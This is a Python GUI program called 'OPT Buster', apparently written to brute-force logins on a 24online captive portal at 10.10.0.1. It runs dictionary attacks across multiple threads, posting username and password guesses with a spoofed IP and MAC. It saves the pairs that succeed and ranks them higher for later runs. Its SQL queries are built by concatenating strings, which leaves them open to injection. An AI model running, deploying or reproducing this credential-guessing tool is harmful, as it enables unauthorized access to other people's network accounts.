#imports
from tkinter import *
import os
import requests
from bs4 import BeautifulSoup
import sqlite3
import threading
import subprocess
from tkinter import messagebox
import time

#Database Connection
global con
con = sqlite3.connect("data.bin")
global sql
sql = con.cursor()
try:
    sql.execute("CREATE TABLE usernames(USERNAME VARCHAR(100) PRIMARY KEY, PRIORITY INT DEFAULT 0)")
    sql.execute("CREATE TABLE passwords(PASSWORD VARCHAR(100) PRIMARY KEY, PRIORITY INT DEFAULT 0)")
except sqlite3.OperationalError:
    print (""),

listdata = []
loggedin = False

#Classes
class InputDialog:
    def __init__(self, parent, label = "Enter"):

        top = self.top = Toplevel(parent)
        frame = Frame(top)
        Label(frame, text=label, anchor = "w").pack(anchor = "w",padx = 5,pady = 4)
        self.e1 = Entry(frame, justify = "left", bd = 1, font = "Helvetica 13")
        self.e1.pack(padx = 5, pady = 5, fill = "x")
        self.priorityValue = IntVar()
        Label(frame, text = "Enter Priority", anchor = "w").pack(anchor = "w", padx = 5, pady = 4)
        self.e2 = Entry(frame, justify = "left", bd = 1, font = "Helvetica 13", textvariable = self.priorityValue)
        self.e2.pack(padx = 5, pady = 5, fill = "x")
        self.inputValue = ""
        b = Button(frame, text="OK", command=self.ok)
        b.pack(pady=5, fill = "x", padx = 5)
        frame.pack(padx = 8, pady = 8)

    def ok(self):
        self.inputValue = self.e1.get()
        try:
            priorityValue = int(self.e2.get())
        except:
            messagebox.showerror("Invalid Input", "Please enter a numeric value")
        self.top.destroy()
        
    def getValue(self):
        return self.inputValue
    
    def getPriority(self):
        return self.priorityValue.get()

class VerticalScrollBar(Frame):
    def __init__(self, parent, *args, **kw):
        Frame.__init__(self, parent, *args, **kw)
        self.canvas = Canvas(parent)
        self.innerFrame = Frame(self.canvas)
        self.scrollbar = Scrollbar(parent, orient = "vertical")
        self.canvas.configure(yscrollcommand = self.scrollbar.set)
        self.scrollbar.pack(side = "right", fill = "y", expand = False)
        self.canvas.pack(side = "left", fill = "both", expand = "yes")
        self.scrollbar.config(command = self.canvas.yview)
        self.canvas.xview_moveto(0)
        self.canvas.yview_moveto(0)
        self.canvasID = self.canvas.create_window((0,0), window = self.innerFrame, anchor = "nw")
        self.innerFrame.bind('<Enter>', self._bound_to_mousewheel)
        self.innerFrame.bind('<Leave>', self._unbound_to_mousewheel)
        self.innerFrame.bind("<Configure>", self._configure_inner_frame)
        self.canvas.bind('<Configure>', self._configure_canvas)

    def _configure_inner_frame(self, event):
        # update the scrollbars to match the size of the inner frame
        size = (self.innerFrame.winfo_reqwidth(), self.innerFrame.winfo_reqheight())
        self.canvas.config(scrollregion = "0 0 %s %s" % size)
        if self.innerFrame.winfo_reqwidth() != self.canvas.winfo_width():
            # update the canvas's width to fit the inner frame
            self.canvas.config(width = self.innerFrame.winfo_reqwidth())

    def _configure_canvas(self, event):
        if self.innerFrame.winfo_reqwidth() != self.innerFrame.winfo_width():
            # update the inner frame's width to fill the canvas
            self.canvas.itemconfigure(self.canvasID, width = self.canvas.winfo_width())

    def _bound_to_mousewheel(self, event):
        self.canvas.bind_all("<MouseWheel>", self._on_mousewheel)   

    def _unbound_to_mousewheel(self, event):
        self.canvas.unbind_all("<MouseWheel>") 

    def _on_mousewheel(self, event):
        self.canvas.yview_scroll(int(-1*(event.delta/120)), "units") 


#GUI
root = Tk()
root.title('OPT Buster')

global logs
logs = StringVar()
mainFrame = Frame(root)

#Threads View
threadLabelFrame = Frame(mainFrame)
threadUsernameArray = []
threadPasswordArray = []
threadStatusArray = []
threadLogsArray = []
threadPauseArray = []

threadCanvas = Canvas(threadLabelFrame)

threadInnerFrame = Frame(threadCanvas)

scrollbar = Scrollbar(threadLabelFrame, orient = "vertical")
threadCanvas.configure(yscrollcommand = scrollbar.set)
scrollbar.pack(side = "right", fill = Y, expand = False)
threadCanvas.pack(side = "left", fill = "both", expand = "yes")
scrollbar.config(command = threadCanvas.yview)

threadCanvas.xview_moveto(0)
threadCanvas.yview_moveto(0)

threadCanvasId = threadCanvas.create_window((0,0), window = threadInnerFrame, anchor = "nw")

def _configure_inner_frame(event):
    # update the scrollbars to match the size of the inner frame
    size = (threadInnerFrame.winfo_reqwidth(), threadInnerFrame.winfo_reqheight())
    threadCanvas.config(scrollregion="0 0 %s %s" % size)
    if threadInnerFrame.winfo_reqwidth() != threadCanvas.winfo_width():
        # update the canvas's width to fit the inner frame
        threadCanvas.config(width = threadInnerFrame.winfo_reqwidth())

def _configure_canvas(event):
    if threadInnerFrame.winfo_reqwidth() != threadInnerFrame.winfo_width():
        # update the inner frame's width to fill the canvas
        threadCanvas.itemconfigure(threadCanvasId, width = threadCanvas.winfo_width())

def _bound_to_mousewheel(event):
    threadCanvas.bind_all("<MouseWheel>", _on_mousewheel)   

def _unbound_to_mousewheel(event):
    threadCanvas.unbind_all("<MouseWheel>") 

def _on_mousewheel(event):
    threadCanvas.yview_scroll(int(-1*(event.delta/120)), "units") 

def _pauseThread(event):
    pauseBtn = event.widget
    threadPause = threadPauseArray[pauseBtn.tag]
    threadPause.set(not threadPause.get())
    if(threadPause.get()):
        pauseBtn.config(text = " Play ")
    else:
        pauseBtn.config(text = "Pause")

def _select_list(event,listBox):
    value = event.widget.cget("text")
    if(listBox == "username"):
        index = list(usernameList.get(0,END)).index(value)
        usernameList.selection_clear(0,END)
        usernameList.see(index)
        usernameList.selection_set(index)
        usernameList.activate(index)
    else:
        index = list(passwordList.get(0,END)).index(value)
        passwordList.selection_clear(0,END)
        passwordList.see(index)
        passwordList.selection_set(index)
        passwordList.activate(index)
        

def _create_thread_view(n):
    threadUsernameArray.clear()
    threadPasswordArray.clear()
    threadStatusArray.clear()
    threadLogsArray.clear()
    threadPauseArray.clear()
    for i in range(n):    
        threadFrame = LabelFrame(threadInnerFrame, text = "Thread "+str(i))
        username = StringVar()
        username.set("Username")
        password = StringVar()
        password.set("Password")
        status = StringVar()
        status.set("Suspended")
        threadLog = StringVar()
        threadLogsArray.append(threadLog)
        pauseState = BooleanVar()
        pauseState.set(False)
        threadPauseArray.append(pauseState)
        statusLabel = Label(threadFrame, textvariable = status, anchor = "w")
        statusLabel.pack(fill = "x", padx = 2, side = "left")
        pauseBtn = Button(threadFrame, text = "Pause", font = "monospaced 9")
        pauseBtn.tag = i
        pauseBtn.bind("<ButtonRelease-1>", lambda event: _pauseThread(event))
        pauseBtn.pack(ipadx = 1, side = "right", fill = "both")
        threadUsernameLabel = Label(threadFrame, textvariable = username, width = 15, anchor = "w")
        threadPasswordLabel = Label(threadFrame, textvariable = password, width = 15, anchor = "w")
        threadUsernameLabel.pack(side = "left", pady = 2, padx = 2)
        threadPasswordLabel.pack(side = "right", pady = 2, padx = 2)
        threadUsernameLabel.bind("<Double-Button-1>", lambda event: _select_list(event,"username"))
        threadPasswordLabel.bind("<Double-Button-1>", lambda event: _select_list(event,"password"))
        threadUsernameArray.append(username)
        threadPasswordArray.append(password)
        threadStatusArray.append(status)
        threadFrame.pack(pady = 4, fill = "y")
    threadLabelFrame.pack(side = "left", anchor = "nw", padx = 6, fill = "both")

threadInnerFrame.bind('<Enter>', _bound_to_mousewheel)
threadInnerFrame.bind('<Leave>', _unbound_to_mousewheel)
threadInnerFrame.bind("<Configure>", _configure_inner_frame)
threadCanvas.bind('<Configure>', _configure_canvas)



#Functional View
functionFrame = Frame(mainFrame)

dictionaryFrame = Frame(functionFrame)

usernameLabelFrame = LabelFrame(dictionaryFrame, text = "Usernames")
usernameInnerFrame = Frame(usernameLabelFrame)
usernameInnerFrame.pack(side = "left")
usernameList = Listbox(usernameInnerFrame, selectmode = EXTENDED)
usernameList.pack(side = "left", fill = "y")

usernameScrollBar = Scrollbar(usernameInnerFrame, orient = "vertical")
usernameScrollBar.config(command = usernameList.yview)
usernameList.config(yscrollcommand = usernameScrollBar.set)
usernameScrollBar.pack(side="right", fill = "y")

usernameOperationFrame = Frame(usernameLabelFrame)
usernameAddBtn = Button(usernameOperationFrame, text = "+", width = 3)
usernameAddBtn.pack()
usernameRemBtn = Button(usernameOperationFrame, text = "-", width = 3)
usernameRemBtn.pack(pady = 3)
usernameOperationFrame.pack(padx = 5, side = "right", anchor = "n")
usernameLabelFrame.pack(side = "left")

passwordLabelFrame = LabelFrame(dictionaryFrame, text = "Passwords")
passwordInnerFrame = Frame(passwordLabelFrame)
passwordInnerFrame.pack(side = "left")
passwordList = Listbox(passwordInnerFrame, selectmode = EXTENDED)
passwordList.pack(side = "left", fill = "y")

passwordScrollBar = Scrollbar(passwordInnerFrame, orient = "vertical")
passwordScrollBar.config(command = passwordList.yview)
passwordList.config(yscrollcommand = passwordScrollBar.set)
passwordScrollBar.pack(side = "right", fill = "y")

passwordOperationFrame = Frame(passwordLabelFrame)
passwordAddBtn = Button(passwordOperationFrame, text = "+", width = 3)
passwordAddBtn.pack()
passwordRemBtn = Button(passwordOperationFrame, text = "-", width = 3)
passwordRemBtn.pack(pady = 3)
passwordOperationFrame.pack(padx = 5)
passwordLabelFrame.pack()

dictionaryFrame.pack()

#Result Frame
resultFrame = LabelFrame(functionFrame, text = "Result")

resultBox = Listbox(resultFrame)
resultBox.pack(fill = "both")
resultFrame.pack(fill = "both")

#Start Frame
startFrame = Frame(functionFrame)
startBtn = Button(startFrame, text = "Run")
startBtn.pack(fill = "both", side = "bottom")
startFrame.pack(fill = "both", side = "bottom")

functionFrame.pack(anchor = "nw", side = "left", pady = 6, fill = "y", padx = 6)

#Log View
logLabelFrame = LabelFrame(mainFrame, text = "Logs")
logs.set("Logs will be generated here!")
logsListBox = Listbox(logLabelFrame, width = 55)

logsScrollBar = Scrollbar(logLabelFrame, orient = "vertical")
logsScrollBar.config(command = logsListBox.yview)
logsListBox.config(yscrollcommand = logsScrollBar.set)
logsScrollBar.pack(side="right", fill = "y")

logsListBox.pack(fill = "both", expand = "yes", anchor = "nw")
logLabelFrame.pack(side = "right", fill = "both", expand = "yes", pady = 6)

mainFrame.pack(fill = "both", expand = "yes", padx = 6, pady = 6)

#Functions
def getnewdata(link,email,password):
    global loggedin
    response = requests.get(link)
    soup = BeautifulSoup(response.text,'html.parser')
    for link in soup.findAll('input',{'name':'loggedinuser'}):
        user = link.get('value')
        if user:
            loggedin = True
        print(email,password,"\n")
        resultBox.insert(resultBox.size(), email + "   =>   " + password)
        inc_priority(email, password)

def opts(email, password):
    try:
        url='http://10.10.0.1/24online/servlet/E24onlineHTTPClient'
        form_data = {
                'mode':'191',
                'isAcessDenied':'null',
                'url':'null',
                'message':'',
                'checkClose':'0',
                'sessionTimeout':'512034',
                'guestmsgreq':'false',
                'logintype':'2',
                'ipaddress':'172.22.54.184',
                'orgSessionTimeout':'512034',
                'chrome':'-1',
                'alerttime':'null',
                'timeout':'512034',
                'popupalert':'0',
                'mac':'08:5b:0e:40:ed:59',
                'servername':'172.20.2.2',
                'dtold':'0',
                'username':email,
                'password':password,
            }
        response = requests.post(url, data = form_data)
        soup = BeautifulSoup(response.text,'html.parser')
        for link in soup.findAll('frame'):
            src = link.get('src')
            newlink = 'http://10.10.0.1'+src
            if len(newlink)>17:
                if loggedin == False:
                    getnewdata(newlink,email,password)
                elif loggedin == True:
                    break
    except:
        print("Error Occured. Trying Again!")
        print("Please ensure you are connected to correct wifi network and 24OnlineClient or 10.10.0.1 is reachable.")
        opts(email, password)

def load_dictionary():
    sql.execute("SELECT * FROM usernames ORDER BY PRIORITY DESC")
    result = sql.fetchall()
    usernameList.delete(0,END)
    i = 0
    for row in result:
        i += 1
        usernameList.insert(i,row[0])
    sql.execute("SELECT * FROM passwords ORDER BY PRIORITY DESC")
    result = sql.fetchall()
    passwordList.delete(0,END)
    i = 0
    for row in result:
        i += 1
        passwordList.insert(i,row[0])

def run_thread(threadName, username, passwords, usernameField, passwordField, statusField, threadLog, threadPause):
    statusField.set("Running!")
    threadLock.acquire()
    logsListBox.insert(END, threadName + " is started!")
    threadLock.release()
    usernameField.set(username)
    for item in passwords:
        if(threadPause.get()):
            statusField.set("Paused!")
            logsListBox.insert(END, threadName + " is paused!")
            while threadPause.get():
                time.sleep(1)
            statusField.set("Running!")
            logsListBox.insert(END, threadName + " is resumed!")
        if loggedin == True:
            logsListBox.insert(END, "Already Logged in")
            break
        passwordField.set(item)
        #logs.set(logs.get() + "\nTrying : Username : " + username + ", Password : " + item)
        #logsListBox.insert(END, "Trying : Username : " + username + ", Password : " + item)
        opts(username, item)
    statusField.set("Thread Finished!")

def _run():
    users = []
    passwords = []
    usersSelected = usernameList.curselection()
    if(len(usersSelected) == 0):
        users = usernameList.get(0, END)
    else:
        for i in usersSelected:
            users.append(usernameList.get(i))

    passwordsSelected = passwordList.curselection()
    if(len(passwordsSelected) == 0):
        passwords = passwordList.get(0,END)
    else:
        for i in passwordsSelected:
            passwords.append(passwordList.get(i))
    i = 0
    mychecklist = ['']
    logsListBox.insert(END, "Dictionary Size >> Username : " + str(len(users)) + ", Password : " + str(len(passwords)))   
    hostname = "10.10.0.1"
    logsListBox.insert(END, "Checking if 10.10.0.1 is reachable!")
    response = os.system("ping -n 1 " + hostname)
    if response == 0:
        logsListBox.insert(END, hostname + ' is up!')
        _create_thread_view(len(users))
        for user in users:
            threading.Thread(target = run_thread, args = ("Thread " + str(i), user, passwords,
                                                          threadUsernameArray[i], threadPasswordArray[i],
                                                          threadStatusArray[i], threadLogsArray[i], threadPauseArray[i])).start()
            i += 1
    else:
        logsListBox.insert(END, hostname + ' is down!')

def inc_priority(username, password):
    sql.execute("UPDATE usernames SET PRIORITY = PRIORITY + 1 WHERE USERNAME LIKE '" + username + "'")
    sql.execute("UPDATE passwords SET PRIORITY = PRIORITY + 1 WHERE PASSWORD LIKE '" + password + "'")
    con.commit()
    load_dictionary()

def addUsername():
    inputDialog = InputDialog(root,"Enter Username")
    root.wait_window(inputDialog.top)
    value = inputDialog.getValue()
    priority = inputDialog.getPriority()
    if(value == ""):
        messagebox.showerror("Error", "Empty Input Provided!")
    else:
        try:
            query = "insert into usernames values('"+value+"', "+str(priority)+")"
            sql.execute(query)
            con.commit()
            messagebox.showinfo("Message","Added Successfully")
            load_dictionary()
        except Exception as err:
            messagebox.showerror("Error Occurred", err)

def addPassword():
    inputDialog = InputDialog(root,"Enter Password")
    root.wait_window(inputDialog.top)
    value = inputDialog.getValue()
    priority = inputDialog.getPriority()
    if(value == ""):
        messagebox.showerror("Error", "Empty Input Provided!")
    else:
        try:
            sql.execute("insert into passwords values('"+value+"', "+str(priority)+")")
            con.commit()
            messagebox.showinfo("Message","Added Successfully")
            load_dictionary()
        except Exception as err:
            messagebox.showerror("Error Occurred", err)

def removeUsername():
    if(len(usernameList.curselection()) != 0):
        result = messagebox.askyesno("Deleting","Are you sure? This will delete all the selected usernames")
        if result:
            values = usernameList.get(0,END)
            for index in usernameList.curselection():
                sql.execute("delete from usernames where username like '" + values[index] + "'")
            con.commit()
            load_dictionary()

def removePassword():
    if(len(passwordList.curselection()) != 0):
        result = messagebox.askyesno("Deleting","Are you sure? This will delete all the selected passwords")
        if result:
            values = passwordList.get(0,END)
            for index in passwordList.curselection():
                sql.execute("delete from passwords where password like '" + values[index] + "'")
            con.commit()
            load_dictionary()


usernameRemBtn.config(command = removeUsername)
usernameAddBtn.config(command = addUsername)
passwordAddBtn.config(command = addPassword)
passwordRemBtn.config(command = removePassword)

threadLock = threading.Lock()
startBtn.config(command = _run)
load_dictionary()

#MainLoop
root.mainloop()
